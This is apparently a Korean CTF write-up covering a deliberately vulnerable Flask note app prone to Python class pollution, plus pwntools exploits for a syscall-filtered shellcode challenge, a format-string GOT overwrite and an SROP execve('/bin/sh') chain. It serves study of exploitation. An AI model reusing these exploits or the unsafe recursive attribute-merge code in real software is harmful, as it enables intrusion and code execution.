## [Web] class note

파이썬 class pollution 문제

```py
import json, os, threading, time
from flask import Flask, request, jsonify, render_template, redirect, session
import const

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()


try:
    const.FLAG = open('./flag.txt', 'r').read()
    
except:
    const.FLAG = 'FLAG{xxxxxx}'

users = {
    'guest': 'guest',
    'admin': os.urandom(32).hex()
}

class Note(object):
    def __init__(self):
        pass

    def view(self):
        return vars(self)
    
def flag(pw):
    if session.get('username') == 'admin' and session.get('isAdmin') == True and pw == app.config['SECRET_KEY']:
        return const.FLAG
    else:
        return '<script>alert("You are not admin");history.go(-1);</script>'
    
def verify(data):
    char = ['a','b','c','d']
    signature = 'beef'

    for c in char:
         if c not in data:
              return False
    if signature not in data:
         return False
    return True

def length(data):
    if len(data) == 64:
        return True

def filter(data):
    keyword = 'FLAG'
    if keyword in data:
        return False

def randpass():
    while True:
        users['admin'] = os.urandom(32).hex()
        time.sleep(1)

def write(data, note):
    for k, v in data.items():
        if hasattr(note, '__getitem__'):
            if note.get(k) and type(v) == dict:
                write(v, note.get(k))
            else:
                note[k] = v
        elif hasattr(note, k) and type(v) == dict:
            write(v, getattr(note, k))
        else:
            setattr(note, k, v)


@app.route('/write', methods=['POST'])
def writeNote():
    data = json.loads(request.data)
    note = Note()
    write(data, note)
    return jsonify(note.view()), 201

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'

        if username == 'admin':
            if pw == password and length(pw) and verify(pw):
                session['username'] = username
                return flag(pw)
        else:
            if pw == password:
                session['username'] = username
                return flag(pw)
        return '<script>alert("wrong password");history.go(-1);</script>'

if __name__ == '__main__':
    rand = threading.Thread(target=randpass)
    rand.start()
    app.run(host='0.0.0.0', port=8000)
```

## [pwn] no syscall

개인적으로 정말 재미있게 푼 문제!
셸코드 문제인데 `syscall`(`0x0f05`)를 필터링한다.

<img src="{{ '/assets/241211/img03.png' | relative_url }}" width="550">
- [Reference](https://www.reddit.com/r/LiveOverflow/comments/14f0qel/syscall_instruction_not_allowed/)
위 레딧을 참고해서 문제를 풀었다.
`0x0f04`를 마지막에 넣어 주고, 셸코드 가장 첫 부분에 이걸 1 증가시키도록 코드를 작성했다.

```py
from pwn import *
 
p = process("./chall")
#p = remote("43.203.123.250", 4002)
context.arch = "amd64"
 
shell = asm("""
    add DWORD PTR [rdx+40], 1
""")
shell += asm(shellcraft.execve("/bin/sh", 0, 0))
 
shell = bytearray(shell)
shell[40] = 0x04
 
p.sendafter("Shellcode Input > ", shell)
 
p.interactive()
```

```py
from pwn import *
 
p = process("./today_dinner")
#p =remote("43.203.123.250", 4003)
e = ELF("./today_dinner")
 
win = 0x4012fc
stack_chk_fail_got = e.got['__stack_chk_fail']
 
p.sendline(b"140")
 
low = win & 0xffff          # 0x05c7
high = (win >> 16) & 0xffff # 0x40
 
payload = ''
payload += '%{}c'.format(high)
payload += '%11$hn'
payload += '%{}c'.format(low - high)
payload += '%12$hn'
payload += 'AA'
payload = bytes(payload, 'utf-8')
payload += p64(stack_chk_fail_got + 2)
payload += p64(stack_chk_fail_got)
 
p.sendlineafter("comment >> ", payload)
 
p.interactive()
```

요런 상황에선 ROP 대신 SROP를 하면 된다. 따라서 그냥 아래처럼 SROP 슉슉 해 줬다.

```py
from pwn import *

p = process("./chall")
context.arch = 'x86_64'

syscall = 0x40113e
praxrbp = 0x40114b

binsh = 0x404030

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = b''
payload += b'A' * 0x10
payload += b'B' * 0x8
payload += p64(praxrbp)
payload += p64(15)
payload += p64(0)
payload += p64(syscall)
payload += bytes(frame)

pause()
p.send(payload)

p.interactive()
```
